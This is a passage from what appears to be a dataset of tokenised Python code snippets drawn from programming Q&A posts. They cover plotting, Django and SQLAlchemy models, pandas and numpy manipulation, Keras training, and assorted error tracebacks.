, i % 2 ] .set_ylabel ( 'Angles ' , fontsize=15 ) fig.set_tight_layout ( True ) # fig.savefig ( 'fig.png ' , facecolor='skyblue ' ) import numpy as npimport matplotlib.pyplot as plt # get a half circle polar plotfig1 , ax1 = plt.subplots ( 1 , 1 , subplot_kw= { 'projection ' : 'polar ' } ) # set facecolor to better display the boundaries # ( as suggested by ImportanceOfBeingErnest ) fig1.set_facecolor ( 'skyblue ' ) theta_min = 0theta_max = np.pitheta = np.linspace ( theta_min , theta_max , 181 ) data = ( 1/6 ) *np.abs ( np.sin ( 3*theta ) /np.sin ( theta/2 ) ) # set 'thetamin ' and 'thetamax ' according to dataax1.set_thetamin ( 0 ) ax1.set_thetamax ( theta_max*180/np.pi ) # actually plot the data , fine tune radius limits and add labelsax1.plot ( theta , data ) ax1.set_ylim ( [ 0 , 1 ] ) ax1.set_xlabel ( 'Magnitude ' , fontsize=15 ) ax1.set_ylabel ( 'Angles ' , fontsize=15 ) fig1.set_tight_layout ( True ) # fig1.savefig ( 'fig1.png ' , facecolor='skyblue ' )"
"class Region ( models.Model ) : id = models.AutoField ( primary_key=True ) name = models.CharField ( max_length=256 ) class Company ( models.Model ) : id = models.AutoField ( primary_key=True ) name = models.CharField ( max_length=256 ) region = models.ForeignKey ( 'Region ' , db_index=True ) class Staff ( models.Model ) : id = models.AutoField ( primary_key=True ) name = models.CharField ( max_length=256 ) company = models.ForeignKey ( 'Company ' , db_index=True )"
`` a b c d e '' -- > `` a b c d e ''
"class Choice ( models.Model ) : ... content_type = models.ForeignKey ( ContentType ) object_id = models.PositiveIntegerField ( ) thing = GenericForeignKey ( 'content_type ' , 'object_id ' ) class Thing ( models.Model ) : choices = GenericRelation ( Choice , related_query_name='things ' ) > > > poll = Poll.objects.create ( question='the question ' , pk=123 ) > > > thing = Thing.objects.create ( pk=456 ) > > > choice = Choice.objects.create ( choice_text='the choice ' , pk=789 , poll=poll , thing=thing ) > > > choice.thing.pk456 > > > thing.choices.get ( ) .pk789 > > > Choice.objects.values_list ( 'things ' , flat=1 ) [ 456 ] > > > Thing.objects.values_list ( 'choices ' , flat=1 ) [ 456 ] > > > Thing.objects.values_list ( 'choices__pk ' , flat=1 ) [ 789 ] > > > print Thing.objects.values_list ( 'choices__pk ' , flat=1 ) .querySELECT `` polls_choice '' . `` id '' FROM `` polls_thing '' LEFT OUTER JOIN `` polls_choice '' ON ( `` polls_thing '' . `` id '' = `` polls_choice '' . `` object_id '' AND ( `` polls_choice '' . `` content_type_id '' = 10 ) ) > > > print Thing.objects.values_list ( 'choices ' , flat=1 ) .querySELECT `` polls_choice '' . `` object_id '' FROM `` polls_thing '' LEFT OUTER JOIN `` polls_choice '' ON ( `` polls_thing '' . `` id '' = `` polls_choice '' . `` object_id '' AND ( `` polls_choice '' . `` content_type_id '' = 10 ) )"
"l1 = [ 1 , 2 , 3 ] l2 = [ a , b , c , d , e , f , g ... ] list = [ 1 , a , 2 , b , 3 , c , d , e , f , g ... ]"
"import md5 # Start hash generationm = md5.new ( ) m.update ( `` Content '' ) # Serialize mserialized_m = serialize ( m ) # In another function/machine , deserialize m # and continue hash generationm2 = deserialize ( serialized_m ) m2.update ( `` More content '' ) m2.digest ( )"
"class Book ( Base ) : id = Column ( Integer , primary_key=True ) chapters = relationship ( `` Chapter '' , backref= '' book '' ) class Chapter ( Base ) : id = Column ( Integer , primary_key=True ) name = Column ( String ) book_id = Column ( Integer , ForeignKey ( Book.id ) ) def check_for_chapter ( book ) : # This is where I want to check to see if the book has a specific chapter . for chapter in book.chapters : if chapter.name == `` 57th Arabian Tale '' return chapter return None"
"df = pd.DataFrame ( [ [ `` A '' , `` first '' , 1.0 , 1.0 , np.NaN ] , [ np.NaN , np.NaN , 2.0 , np.NaN , 2.0 ] , [ np.NaN , np.NaN , np.NaN , 3.0 , 3.0 ] ] , columns= [ `` ID '' , `` Name '' , `` val1 '' , `` val2 '' , `` val3 '' ] , index= [ 0 , 0 , 0 ] ) Out [ 4 ] : ID Name val1 val2 val30 A first 1 1 NaN0 NaN NaN 2 NaN 20 NaN NaN NaN 3 3 ID Name val1 val2 val30 A first 1 1 20 NaN NaN 2 3 30 NaN NaN NaN NaN NaN df = pd.DataFrame ( [ [ `` A '' , `` first '' , 1.0 , 1.0 , np.NaN ] , [ np.NaN , np.NaN , 2.0 , np.NaN , 2.0 ] , [ np.NaN , np.NaN , np.NaN , 3.0 , 3.0 ] , [ `` B '' , `` second '' , 4.0 , 4.0 , np.NaN ] , [ np.NaN , np.NaN , 5.0 , np.NaN , 5.0 ] , [ np.NaN , np.NaN , np.NaN , 6.0 , 6.0 ] ] , columns= [ `` ID '' , `` Name '' , `` val1 '' , `` val2 '' , `` val3 '' ] , index= [ 0 , 0 , 0 , 1 , 1 , 1 ] ) Out [ 5 ] : ID Name val1 val2 val30 A first 1 1 NaN0 NaN NaN 2 NaN 20 NaN NaN NaN 3 31 B second 4 4 NaN1 NaN NaN 5 NaN 51 NaN NaN NaN 6 6 ID Name val1 val2 val30 A first 1 1 20 NaN NaN 2 3 30 NaN NaN NaN NaN NaN1 B second 4 4 51 NaN NaN 5 6 61 NaN NaN NaN NaN NaN pd.concat ( [ df [ col ] .sort_values ( ) .reset_index ( drop=True ) for col in df ] , axis=1 , ignore_index=True ) pd.concat ( [ df [ col ] .sort_values ( ) .reset_index ( drop=True ) for col in df ] , axis=1 , ignore_index=False ) new_df = df.ix [ 0 ] new_df = pd.concat ( [ new_df [ col ] .sort_values ( ) .reset_index ( drop=True ) for col in new_df ] , axis=1 , ignore_index=False ) max_index = df.index [ -1 ] for i in range ( 1 , max_index + 1 ) : tmp = df.ix [ i ] tmp = pd.concat ( [ tmp [ col ] .sort_values ( ) .reset_index ( drop=True ) for col in tmp ] , axis=1 , ignore_index=False ) new_df = pd.concat ( [ new_df , tmp ] ) In [ 10 ] : new_dfOut [ 10 ] : ID Name val1 val2 val30 A first 1 1 21 NaN NaN 2 3 32 NaN NaN NaN NaN NaN0 B second 4 4 51 NaN NaN 5 6 62 NaN NaN NaN NaN NaN"
"Xindex match 0 0 thank 1 0 thank 1 thanks 2 thanking 2 0 thanked Xindex 0 thank 1 [ thank , thanks , thanking ] 2 thanked"
"import numpy as npnb_el = 10table = np.arange ( nb_el , dtype='float64 ' ) print tablebinary = table.tostring ( ) binary_list = map ( `` .join , zip ( * [ iter ( binary ) ] * table.dtype.itemsize ) ) print 'len binary list : ' , len ( binary_list ) # len binary list : 10join_binary_list = `` .join ( binary_list ) print np.fromstring ( join_binary_list , dtype='float64 ' ) # [ 0 . 1 . 2 . 3 . 4 . 5 . 6 . 7 . 8 . 9 . ] binary_split_array = np.array ( binary_list ) print 'nb el : ' , binary_split_array.shape # nb el : ( 10 , ) print 'nb_el * size : ' , binary_split_array.shape [ 0 ] * binary_split_array.dtype.itemsize # nb_el * size : 80join_binary_split_array = `` .join ( binary_split_array ) print 'len binary array : ' , len ( join_binary_split_array ) # len binary array : 72table_fromstring = np.fromstring ( join_binary_split_array , dtype='float64 ' ) print table_fromstring # [ 1 . 2 . 3 . 4 . 5 . 6 . 7 . 8 . 9 . ]"
abhishek ~ $ apt-cache search ipython3-qtconsoleipython3 - enhanced interactive Python 3 shellipython3-qtconsole - enhanced interactive Python 3 shell - Qt console
"def myGen ( x ) : for i in range ( x ) : yield ig5 = myGen ( 5 ) ; g10 = myGen ( 10 ) ; g15 = myGen ( 15 ) cycleList = [ g5 , g10 , g15 ] 0 0 0 1 1 1 2 2 2 3 3 3 4 4 4 5 5 6 6 7 7 8 8 9 9 10 11 12 13 14"
"for i , j in enumerate ( np.unique ( y_set ) ) : plt.scatter ( X_set [ y_set == j , 0 ] , X_set [ y_set == j , 1 ] , c = ListedColormap ( ( 'red ' , 'green ' ) ) ( i ) , label = j ) X_set [ y_set == j , 0 ] , X_set [ y_set == j , 1 ]"
"In [ 1 ] : import numpy as npIn [ 2 ] : a = np.random.randn ( 1000000 ) In [ 3 ] : a = a.astype ( np.float32 ) In [ 4 ] : % timeit np.argsort ( a ) 86.1 ms ± 1.59 ms per loop ( mean ± std . dev . of 7 runs , 10 loops each ) # include < iostream > # include < vector > # include < cstddef > # include < algorithm > # include < opencv2/opencv.hpp > # include < numeric > # include < utility > int main ( ) { std : :vector < float > numbers ; for ( int i = 0 ; i ! = 1000000 ; ++i ) { numbers.push_back ( ( float ) rand ( ) / ( RAND_MAX ) ) ; } double e1 = ( double ) cv : :getTickCount ( ) ; std : :vector < size_t > idx ( numbers.size ( ) ) ; std : :iota ( idx.begin ( ) , idx.end ( ) , 0 ) ; std : :sort ( idx.begin ( ) , idx.end ( ) , [ & numbers ] ( const size_t & a , const size_t & b ) { return numbers [ a ] < numbers [ b ] ; } ) ; double e2 = ( double ) cv : :getTickCount ( ) ; std : :cout < < `` Finished in `` < < 1000 * ( e2 - e1 ) / cv : :getTickFrequency ( ) < < `` milliseconds . '' < < std : :endl ; return 0 ; } # include < iostream > # include < vector > # include < cstddef > # include < algorithm > # include < opencv2/opencv.hpp > # include < numeric > # include < utility > int main ( ) { //std : :vector < float > numbers ; float numbers [ 1000000 ] ; for ( int i = 0 ; i ! = 1000000 ; ++i ) { numbers [ i ] = ( ( float ) rand ( ) / ( RAND_MAX ) ) ; } double e1 = ( double ) cv : :getTickCount ( ) ; std : :vector < size_t > idx ( 1000000 ) ; std : :iota ( idx.begin ( ) , idx.end ( ) , 0 ) ; std : :sort ( idx.begin ( ) , idx.end ( ) , [ & numbers ] ( const size_t & a , const size_t & b ) { return numbers [ a ] < numbers [ b ] ; } ) ; double e2 = ( double ) cv : :getTickCount ( ) ; std : :cout < < `` Finished in `` < < 1000 * ( e2 - e1 ) / cv : :getTickFrequency ( ) < < `` milliseconds . '' < < std : :endl ; return 0 ; }"
"{ Subject : `` Dave '' , Strength : [ 1,2,3,4 ] } , { Subject : `` Dave '' , Strength : [ 1,2,3,5 ] } , { Subject : `` Dave '' , Strength : [ 1,2,3,6 ] } , { Subject : `` Stuart '' , Strength : [ 4,5,6,7 ] } , { Subject : `` Stuart '' , Strength : [ 6,5,6,7 ] } , { Subject : `` Kevin '' , Strength : [ 1,2,3,4 ] } , { Subject : `` Kevin '' , Strength : [ 9,4,3,4 ] } { Subject : `` Dave '' , mean_strength = [ 1,2,3,5 ] } , { Subject : `` Stuart '' , mean_strength = [ 5,5,6,7 ] } , { Subject : `` Kevin '' , mean_strength = [ 5,3,3,4 ] } pipe = [ { ' $ group ' : { '_id ' : 'Subject ' , 'mean_strength ' : { ' $ avg ' : ' $ Strength ' } } } ] results = db.Walk.aggregate ( pipeline=pipe ) Out : [ { '_id ' : 'SubjectID ' , 'total ' : None } ]"
"# list testimport timeclass List ( object ) : class Cons ( object ) : def __init__ ( self , x , tail ) : self.x= x self.tail=tail class Nil ( object ) : def __init__ ( self ) : pass @ classmethod def cons ( cls , cons ) : return List ( cons , None ) @ classmethod def nil ( cls , nil ) : return List ( None , nil ) def __init__ ( self , cons , nil ) : self.cons = cons self.nil = nildef replicate ( n , x ) : return List.nil ( List.Nil ( ) ) if n == 0 else List.cons ( List.Cons ( x , replicate ( n-1 , x ) ) ) t1 = time.time ( ) List.cons ( List.Cons ( object ( ) , List.nil ( List.Nil ( ) ) ) ) t2 = time.time ( ) - t1print t2 $ ./a.py Version : ImageMagick 6.8.8-10 Q16 x86_64 2014-04-08 http : //www.imagemagick.orgCopyright : Copyright ( C ) 1999-2014 ImageMagick Studio LLCFeatures : DPC Modules OpenMPDelegates : bzlib djvu ltdl png zlibUsage : import [ options ... ] [ file ] Image Settings : -adjoin join images into a single multi-image file -border include window border in the output image -channel type apply option to select image channels -colorspace type alternate image colorspace -comment string annotate image with comment -compress type type of pixel compression when writing the image -define format : option define one or more image format options -density geometry horizontal and vertical density of the image -depth value image depth -descend obtain image by descending window hierarchy -display server X server to contact -dispose method layer disposal method -dither method apply error diffusion to image -delay value display the next image after pausing -encipher filename convert plain pixels to cipher pixels -endian type endianness ( MSB or LSB ) of the image -encoding type text encoding type -filter type use this filter when resizing an image -format `` string '' output formatted image characteristics -frame include window manager frame -gravity direction which direction to gravitate towards -identify identify the format and characteristics of the image -interlace type None , Line , Plane , or Partition -interpolate method pixel color interpolation method -label string assign a label to an image -limit type value Area , Disk , Map , or Memory resource limit -monitor monitor progress -page geometry size and location of an image canvas -pause seconds seconds delay between snapshots -pointsize value font point size -quality value JPEG/MIFF/PNG compression level -quiet suppress all warning messages -regard-warnings pay attention to warning messages -respect-parentheses settings remain in effect until parenthesis boundary -sampling-factor geometry horizontal and vertical sampling factor -scene value image scene number -screen select image from root window -seed value seed a new sequence of pseudo-random numbers -set property value set an image property -silent operate silently , i.e . do n't ring any bells -snaps value number of screen snapshots -support factor resize support : > 1.0 is blurry , < 1.0 is sharp -synchronize synchronize image to storage device -taint declare the image as modified -transparent-color color transparent color -treedepth value color tree depth -verbose print detailed information about the image -virtual-pixel method Constant , Edge , Mirror , or Tile -window id select window with this id or nameImage Operators : -annotate geometry text annotate the image with text -colors value preferred number of colors in the image -crop geometry preferred size and location of the cropped image -encipher filename convert plain pixels to cipher pixels -geometry geometry preferred size or location of the image -help print program options -monochrome transform image to black and white -negate replace every pixel with its complementary color -repage geometry size and location of an image canvas -quantize colorspace reduce colors in this colorspace -resize geometry resize the image -rotate degrees apply Paeth rotation to the image -strip strip image of all profiles and comments -thumbnail geometry create a thumbnail of the image -transparent color make this color transparent within the image -trim trim image edges -type type image typeMiscellaneous Options : -debug events display copious debugging information -help print program options -list type print a list of supported option arguments -log format format of debugging information -version print version informationBy default , 'file ' is written in the MIFF image format . Tospecify a particular image format , precede the filename with an imageformat name and a colon ( i.e . ps : image ) or specify the image type asthe filename suffix ( i.e . image.ps ) . Specify 'file ' as '- ' forstandard input or output.import : delegate library support not built-in ` ' ( X11 ) @ error/import.c/ImportImageCommand/1303../a.py : line 3 : syntax error near unexpected token ` ( './a.py : line 3 : ` class List ( object ) : '"
"df1 : Date A B C 1990-01-01 3.0 40.0 70.0 1990-01-02 20.0 50.0 80.0 1990-01-03 30.0 60.0 90.0 1990-01-04 2.0 1.0 1.0 1990-01-05 1.0 8.0 3.0 df2 : Date A B C 2000-01-01 NaN NaN NaN 2000-01-02 5.0 NaN NaN 2000-01-03 1.0 NaN 5.0 2000-01-04 2.0 4.0 8.0 2000-01-05 1.0 3.0 4.0 df2.merge ( df1 , how = 'left ' , on = 'Date ' ) Date A.x B.x C.x A.y B.y C.y 2000-01-01 NaN NaN NaN 3.0 4.0 5.02000-01-02 5.0 NaN NaN 5.0 9.0 2.02000-01-03 1.0 NaN 5.0 1.0 6.0 5.02000-01-04 2.0 4.0 8.0 2.0 4.0 1.02000-01-05 1.0 3.0 4.0 1.0 3.0 3.0 comparison_dict = { `` A '' : True , `` B '' : True , `` C '' : False }"
"import nidsdef handle_tcp_stream ( tcp ) : print `` In handle_tcp_stream '' def extract ( pcap_file ) : nids.param ( `` tcp_workarounds '' , 1 ) nids.param ( `` pcap_filter '' , `` tcp '' ) # bpf restrict to TCP only , note nids.param ( `` scan_num_hosts '' , 0 ) # disable portscan detection nids.chksum_ctl ( [ ( ' 0.0.0.0/0 ' , False ) ] ) # disable checksumming nids.param ( `` filename '' , pcap_file ) nids.init ( ) nids.register_tcp ( handle_tcp_stream ) try : nids.run ( ) except Exception , e : print `` Exception `` , pcap_file + `` `` , edef main ( ) : extract ( `` a.pcap '' ) print `` Done '' extract ( `` a.pcap '' ) if __name__ == `` __main__ '' : main ( ) In handle_tcp_streamIn handle_tcp_streamIn handle_tcp_streamIn handle_tcp_streamDone"
"from kivy.app import Appfrom kivy.uix.button import Buttonclass CalcApp ( App ) : def build ( self ) : return Button ( text= '' Hello World '' ) if __name__ == '__main__ ' : CalcApp ( ) .run ( ) [ INFO ] [ Logger ] Record log in /home/kyle/.kivy/logs/kivy_17-10-19_40.txt [ INFO ] [ Kivy ] v1.10.0 [ INFO ] [ Python ] v3.6.2 ( default , Jul 20 2017 , 03:52:27 ) [ GCC 7.1.1 20170630 ] [ INFO ] [ Factory ] 194 symbols loaded [ INFO ] [ Image ] Providers : img_tex , img_dds , img_sdl2 , img_gif ( img_pil , img_ffpyplayer ignored ) [ INFO ] [ Text ] Provider : sdl2 [ INFO ] [ OSC ] using < multiprocessing > for socket [ INFO ] [ Window ] Provider : sdl2 ( [ 'window_egl_rpi ' ] ignored ) X Error of failed request : BadWindow ( invalid Window parameter ) Major opcode of failed request : 4 ( X_DestroyWindow ) Resource id in failed request : 0x0 Serial number of failed request : 151 Current serial number in output stream : 152"
import tkinter as tkwindow = tk.Tk ( )
Id antecedent descendant1 one two2 two one3 two three4 one three5 three two Id antecedent descendant1 one two3 two three4 one three
def manipulate ( line ) : # a pure python function which transforms the data # ... return manipulated_jsonfor line in f : components.append ( manipulate ( ujson.loads ( line ) ) ) write_to_csv ( components ) ` import dask.bag as bagimport jsonbag.from_filenames ( 'input.json.gz ' ) .map ( json.loads ) .map ( lambda x : manipulate ( x ) ) .concat ( ) .to_dataframe ( ) .to_csv ( 'output.csv.gz ' ) `
"data = { 'PersonX ' : 'Person1 ' , 'PersonY ' : 'Person1 ' , 'PersonZ ' : 'Person 2 ' , 'Person1 ' : 'Person100 ' , 'Person2 ' : 'Person100 ' } import pandas as pdimport networkx as nxd = { 'PersonX ' : 'Person1 ' , 'PersonY ' : 'Person1 ' , 'PersonZ ' : 'Person2 ' , 'Person1 ' : 'Person100 ' , 'Person2 ' : 'Person100 ' } df = pd.DataFrame ( d.items ( ) , columns= [ 'Person ' , 'Manager ' ] ) G = nx.from_pandas_edgelist ( df , source='Person ' , target='Manager ' ) nx.draw ( G , with_labels=True ) plt.show ( ) import pandas as pdimport matplotlib.pyplot as pltfrom sklearn.preprocessing import LabelEncoderfrom scipy.cluster import hierarchydf2 = df.apply ( LabelEncoder ( ) .fit_transform ) df2.set_index ( 'Manager ' , inplace=True ) Z = hierarchy.linkage ( df2 , 'ward ' ) hierarchy.dendrogram ( hierarchy.linkage ( df2 , method='ward ' ) ) plt.show ( ) print ( 'strict digraph tree { ' ) for row in d.items ( ) : print ( ' { 0 } - > { 1 } ; '.format ( *row ) ) print ( ' } ' )"
"+ -- -- -- -- -- -- + -- -- -- -- -+ -- -- -- -- -+ -- -- -- -- -- + -- -- -- -- +| Movie Name | English | Chinese | Japanese | Korean |+ -- -- -- -- -- -- + -- -- -- -- -+ -- -- -- -- -+ -- -- -- -- -- + -- -- -- -- +| A | 1 | 0 | 0 | 0 || B | 0 | 1 | 1 | 0 || C | 0 | 1 | 1 | 1 || D | 1 | 0 | 0 | 0 || E | 0 | 1 | 0 | 0 |+ -- -- -- -- -- -- + -- -- -- -- -+ -- -- -- -- -+ -- -- -- -- -- + -- -- -- -- + + -- -- -- -- -- -- + -- -- -- -- -- -- -- -- -- -- -- -- -+| Movie Name | Languages |+ -- -- -- -- -- -- + -- -- -- -- -- -- -- -- -- -- -- -- -+| A | English || B | Chinese , Japanese || C | Chinese , Japanese , Korean || D | English || E | Chinese |+ -- -- -- -- -- -- + -- -- -- -- -- -- -- -- -- -- -- -- -+"
> > > s = ' < div > < 20 < /div > ' > > > import lxml.html > > > tree = lxml.html.fromstring ( s ) > > > lxml.etree.tostring ( tree ) ' < div > < /div > '
"from abc import abstractmethod , ABCMetaclass AbstractBase ( object ) : __metaclass__ = ABCMeta @ abstractmethod def must_implement_this_method ( self ) : raise NotImplementedError ( ) class ConcreteClass ( AbstractBase ) : def extra_function ( self ) : print ( 'hello ' ) # def must_implement_this_method ( self ) : # print ( `` Concrete implementation '' ) d = ConcreteClass ( ) # no errord.extra_function ( )"
"% load_ext rmagic % R a=c ( 1,2,3 ) ; b=c ( 2,3,4 ) ; print ( summary ( lm ( a~b ) ) )"
"base_model = applications.VGG16 ( weights='imagenet ' , include_top=False , input_shape= ( img_rows , img_cols , img_channel ) ) add_model = Sequential ( ) add_model.add ( Flatten ( input_shape=base_model.output_shape [ 1 : ] ) ) add_model.add ( Dense ( 256 , activation='relu ' ) ) add_model.add ( Dense ( n_classes , activation='sigmoid ' ) ) # n classesmodel = Model ( inputs=base_model.input , outputs=add_model ( base_model.output ) ) model.compile ( loss='binary_crossentropy ' , optimizer=optimizers.SGD ( lr=1e-4 , momentum=0.9 ) , metrics= [ 'accuracy ' ] ) # # # # # # # # # # # # # # # # # # # # # # batch_size = 32epochs = 50print ( 'Running the image data generator ... ' ) train_datagen = ImageDataGenerator ( rotation_range=30 , width_shift_range=0.1 , height_shift_range=0.1 , horizontal_flip=True ) train_datagen.fit ( x_train ) print ( 'Fitting the model ... ' ) history = model.fit_generator ( train_datagen.flow ( x_train , y_train , batch_size=batch_size ) , steps_per_epoch=x_train.shape [ 0 ] // batch_size , epochs=epochs , # validation_data= ( x_valid , y_valid ) , # callbacks= [ ModelCheckpoint ( model_checkpoint , monitor='val_acc ' , save_best_only=True ) ] ) # # # # # # # # # # # # # # # # # # # # # # # # Predict # print ( 'Predicting ... ' ) # p_valid = model.predict ( x_valid , batch_size=128 ) # # Write predictions to csv # print ( 'Saving predictions to CSV ... ' ) # df = pd.DataFrame ( p_valid ) # df [ 'image ' ] = split + 1 + df.index # df.to_csv ( out_csv , index=False , header=False ) '' '' '' Save model , including these details : -the architecture of the model , allowing to re-create the model-the weights of the model-the training configuration ( loss , optimizer ) -the state of the optimizer , allowing to resume training exactly where you left off . `` `` '' print ( `` Saving model '' ) model.save ( `` /vgg16-model-50epochs.h5 '' ) print ( 'Processing complete . ' ) import glob , os , timeimport cv2import numpy as npimport pandas as pdfrom keras.models import load_model # from keras.models import model_from_json # Path to the input tiles which will be used to predict classesinws = '/image-directory-for-another-study-area'tiles = glob.glob ( os.path.join ( inws , '*.tif ' ) ) # h5 file from trained modelin_h5 = `` /vgg16-model-50epochs.h5 '' # Output model predictions in csv formatout_csv = '/new-predictions.csv ' # Read images and convert to numpy arrayx_test = np.array ( [ cv2.imread ( tile ) for tile in tiles ] , np.float16 ) / 255.print ( 'Loading existing model ... ' ) loaded_model = load_model ( in_h5 ) print ( `` Predicting on image tiles ... '' ) predictions = loaded_model.predict ( x_test , batch_size=128 ) # Save to csvdf = pd.DataFrame ( predictions ) df [ 'image ' ] = df.index + 1df.to_csv ( out_csv , index=False , header=False ) print ( `` Predictions saved to disk : { 0 } '' .format ( out_csv ) )"
"from joblib import Parallel , delayedimport theanofrom theano import tensor as teimport numpy as npclass TheanoModel ( object ) : def __init__ ( self ) : X = te.dvector ( ' X ' ) Y = ( X ** te.log ( X ** 2 ) ) .sum ( ) self.theano_get_Y = theano.function ( [ X ] , Y ) def get_Y ( self , x ) : return self.theano_get_Y ( x ) def run ( niter=100 ) : x = np.random.randn ( 1000 ) model = TheanoModel ( ) pool = Parallel ( n_jobs=-1 , verbose=1 , pre_dispatch='all ' ) # this fails with ` TypeError : ca n't pickle instancemethod objects ` ... results = pool ( delayed ( model.get_Y ) ( x ) for _ in xrange ( niter ) ) # # ... but this works ! Why ? # results = pool ( delayed ( model.theano_get_Y ) ( x ) for _ in xrange ( niter ) ) if __name__ == '__main__ ' : run ( ) from joblib import Parallel , delayedimport theanofrom theano import tensor as teimport numpy as npclass TheanoModel ( object ) : def __init__ ( self ) : X = te.dvector ( ' X ' ) Y = ( X ** te.log ( X ** 2 ) ) .sum ( ) self.theano_get_Y = theano.function ( [ X ] , Y ) def square ( x ) : return x ** 2 self.member_function = square self.static_method = staticmethod ( square ) self.lambda_function = lambda x : x ** 2def run ( niter=100 ) : x = np.random.randn ( 1000 ) model = TheanoModel ( ) pool = Parallel ( n_jobs=-1 , verbose=1 , pre_dispatch='all ' ) # # not allowed : ` TypeError : ca n't pickle function objects ` # results = pool ( delayed ( model.member_function ) ( x ) for _ in xrange ( niter ) ) # # not allowed : ` TypeError : ca n't pickle function objects ` # results = pool ( delayed ( model.lambda_function ) ( x ) for _ in xrange ( niter ) ) # # also not allowed : ` TypeError : ca n't pickle staticmethod objects ` # results = pool ( delayed ( model.static_method ) ( x ) for _ in xrange ( niter ) ) # but this is totally fine ! ? results = pool ( delayed ( model.theano_get_Y ) ( x ) for _ in xrange ( niter ) ) if __name__ == '__main__ ' : run ( )"
"# ! /bin/env python # -*- coding : utf-8 -*- # extracted and licensing from here : '' '' '' : author : Laurent Pointal < laurent.pointal @ limsi.fr > < laurent.pointal @ laposte.net > : organization : CNRS - LIMSI : copyright : CNRS - 2004-2009 : license : GNU-GPL Version 3 or greater : version : $ Id $ '' '' '' # Chars alonemarks : # ! ? ¿ ; , *¤ @ ° : % |¦/ ( ) [ ] { } < > « » ´ ` ¨ & ~= # ±£¥ $ ©® '' # must have spaces around them to make them tokens. # Notes : they may be in pchar or fchar too , to identify punctuation after # a fchar. # \202 is a special , # \226 \227 are special -alonemarks = u '' ! ? ¿ ; , \202*¤ @ ° : % |¦/ ( ) [ \ ] { } < > « » ´ ` ¨ & ~= # ±\226 '' +\ u '' \227£¥ $ ©®\ '' '' import unicodedatafor x in alonemarks : unicodename = unicodedata.name ( x , ' < unknown > ' ) print `` \t '' .join ( map ( unicode , ( x , len ( x ) , ord ( x ) , unicodename , unicodedata.category ( x ) ) ) ) # unichr ( int ( 'fd9b ' , 16 ) ) .encode ( 'utf-8 ' ) # http : //stackoverflow.com/questions/867866/convert-unicode-codepoint-to-utf8-hex-in-python"
"import numpy as npdef different ( array ) : res = [ ] for ( x1 , y1 ) , ( x2 , y2 ) in array : if ( x1 , y1 ) ! = ( x2 , y2 ) : res.append ( [ ( x1 , y1 ) , ( x2 , y2 ) ] ) return resa = np.array ( [ [ [ 1 , 2 ] , [ 3 , 4 ] ] , [ [ 1 , 2 ] , [ 1 , 2 ] ] , [ [ 7 , 9 ] , [ 6 , 3 ] ] , [ [ 3 , 3 ] , [ 3 , 3 ] ] ] ) out = different ( a ) # get [ [ ( 1 , 2 ) , ( 3 , 4 ) ] , # [ ( 7 , 9 ) , ( 6 , 3 ) ] ]"
"[ ? ,227,227 ] weight_tensor = tf.truncated_normal ( [ 227,227 ] , ** { 'stddev':0.1 , 'mean':0.0 } ) weight_var = tf.Variable ( weight_tensor ) matrix = tf.batch_matmul ( prev_net_2d , weight_var )"
"import numpy as np class NewArrayClass ( np.ndarray ) : __array_priority__ = 3.0 def __array_wrap__ ( self , out_arr , context=None ) : if out_arr.shape == self.shape : out = out_arr.view ( new_array ) # Do a bunch of class dependant initialization and attribute copying . # ... return out else : return np.asarray ( out_arr ) A = np.arange ( 10 ) A.shape = ( 5 , 2 ) A = arr.view ( NewArrayClass ) # Would like this to be np.ndarray , but get new_array_class.print type ( np.sum ( A , 0 ) )"
# ! /usr/bin/pythonimport sysfrom PyQt4.QtGui import QApplicationfrom PyQt4.QtCore import QUrlfrom PyQt4.QtWebKit import QWebViewapp = QApplication ( sys.argv ) v = QWebView ( ) v.load ( QUrl ( `` http : //127.0.0.1/j.html '' ) ) v.show ( ) app.exec_ ( ) < html > < script > alert ( `` I am here '' ) ; < /script > < body > Hello World < /body > < /html >
"def js_code_copy ( content ) return `` '' '' var body = document.getElementsByTagName ( 'body ' ) [ 0 ] ; var tmp_textbox = document.createElement ( 'input ' ) ; body.appendChild ( tmp_textbox ) ; tmp_textbox.setAttribute ( 'value ' , ' { content } ' ) ; tmp_textbox.select ( ) ; document.execCommand ( 'copy ' ) ; body.removeChild ( tmp_textbox ) ; '' '' '' .format ( content=content.replace ( `` ' '' , '\\'+ '' ' '' ) ) from IPython.display import display , Javascriptcontent = `` boom '' display ( Javascript ( js_code_copy ( `` Copy me to clipboard '' ) ) )"
while True : exec ( `` break '' ) SyntaxError : 'break ' outside loop
Example # 1G = pgv.AGraph ( directed=False ) G.is_directed ( ) # trueExample # 2G = pgv.AGraph ( ) G.to_undirected ( ) .is_directed ( ) # TrueExample # 3G = pgv.AGraph ( directed=False ) G.graph_attr.update ( directed=False ) G.is_directed ( ) # true
"con = sqlite3.connect ( ' : MEMORY : ' ) con.execute ( `` 'CREATE TABLE ABCD ( A TEXT NOT NULL , B TEXT NOT NULL , C TEXT NOT NULL , D TEXT NOT NULL , PRIMARY KEY ( A , B ) ) ' '' ) with con : for a , b , c , d in inputs : try : con.execute ( 'INSERT INTO ABCD VALUES ( ? , ? , ? , ? ) ' , ( a , b , c , d ) ) except sqlite3.IntegrityError as e : # Skip 'not unique ' errors , but raise others . if not e.message.endswith ( 'not unique ' ) : raisecon.close ( )"
"d = { k , lambda s : s * A [ k ] for k in range ( n ) } # e.g . n = 4"
"> > > from amazon.api import AmazonAPI > > > access_key='amazon-access-key ' > > > secret ='amazon-secret-key ' > > > assoc ='amazon-associate-account-name ' > > > amazon = AmazonAPI ( access_key , secret , assoc ) > > > product = amazon.lookup ( ItemId='1632360705 ' ) Traceback ( most recent call last ) : File `` < console > '' , line 1 , in < module > File `` /home/tsuko/.virtualenvs/django17/lib/python3.4/site-packages/amazon/api.py '' , line 161 , in lookup response = self.api.ItemLookup ( ResponseGroup=ResponseGroup , **kwargs ) File `` /home/tsuko/.virtualenvs/django17/lib/python3.4/site-packages/bottlenose/api.py '' , line 242 , in __call__ { 'api_url ' : api_url , 'cache_url ' : cache_url } ) File `` /home/tsuko/.virtualenvs/django17/lib/python3.4/site-packages/bottlenose/api.py '' , line 203 , in _call_api return urllib2.urlopen ( api_request , timeout=self.Timeout ) File `` /usr/lib/python3.4/urllib/request.py '' , line 153 , in urlopen return opener.open ( url , data , timeout ) File `` /usr/lib/python3.4/urllib/request.py '' , line 461 , in open response = meth ( req , response ) File `` /usr/lib/python3.4/urllib/request.py '' , line 571 , in http_response 'http ' , request , response , code , msg , hdrs ) File `` /usr/lib/python3.4/urllib/request.py '' , line 499 , in error return self._call_chain ( *args ) File `` /usr/lib/python3.4/urllib/request.py '' 